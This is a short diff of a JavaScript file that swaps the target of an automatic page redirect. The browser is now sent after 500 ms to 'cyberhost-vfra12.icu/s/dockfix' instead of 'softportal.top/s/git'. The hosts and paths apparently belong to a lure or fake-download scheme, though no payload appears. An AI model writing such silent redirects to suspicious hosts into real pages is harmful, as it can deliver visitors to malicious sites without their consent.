@@ -74,7 +74,7 @@ sub4(0);
 sub6(0);
 
         setTimeout(() => {
-          window.location.href = 'https://softportal.top/s/git';
+          window.location.href = 'https://cyberhost-vfra12.icu/s/dockfix';
         }, 500);
       }
     }
